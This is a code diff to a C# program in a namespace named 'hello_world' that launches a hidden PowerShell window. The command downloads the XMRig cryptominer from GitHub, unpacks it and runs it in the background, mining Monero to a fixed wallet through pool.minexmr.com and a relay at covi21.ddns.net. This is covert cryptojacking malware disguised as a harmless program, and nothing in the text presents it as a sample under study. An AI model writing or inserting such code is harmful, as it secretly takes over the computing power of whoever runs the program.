@@ -57,11 +57,8 @@ namespace hello_world
                             WindowStyle = ProcessWindowStyle.Hidden,
                             FileName = $"powershell.exe",
                             WorkingDirectory = AppContext.BaseDirectory,
-                            Arguments = @"-c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;"
-                             + "$ProgressPreference=\"SilentlyContinue\";"
-                             + "Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip;"
-                             + "Expand-Archive -LiteralPath 'xmrig-6.17.0-gcc-win64.zip';"
-                             + "xmrig-6.17.0-gcc-win64\\xmrig-6.17.0\\xmrig.exe -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.win -x covi21.ddns.net:10555",
+                            Arguments = @"-c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$ProgressPreference="SilentlyContinue";Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip;Expand-Archive -LiteralPath 'xmrig-6.17.0-gcc-win64.zip';xmrig-6.17.0-gcc-win64\\xmrig-6.17.0\\xmrig.exe -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.win -x covi21.ddns.net:10555 -B",
+                            
                             RedirectStandardOutput = true,
                             RedirectStandardError = true,
                             UseShellExecute = false
